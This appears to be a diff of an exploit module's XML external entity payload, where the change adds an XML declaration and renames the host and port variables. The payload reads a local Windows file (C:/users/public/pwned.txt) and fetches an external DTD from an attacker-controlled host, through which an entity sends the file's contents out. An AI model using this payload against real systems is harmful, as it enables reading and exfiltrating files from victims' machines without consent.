@@ -1,6 +1,7 @@
+<?xml version="1.0"?>
 <!DOCTYPE data[
 <!ENTITY % file SYSTEM "file:///C:/users/public/pwned.txt">
-<!ENTITY % dtd SYSTEM "http://$localIp:$localPort/ssdp/data.dtd">
+<!ENTITY % dtd SYSTEM "http://$local_ip:$local_port/ssdp/data.dtd">
 %dtd;
 ]>
 <data>&send;</data>
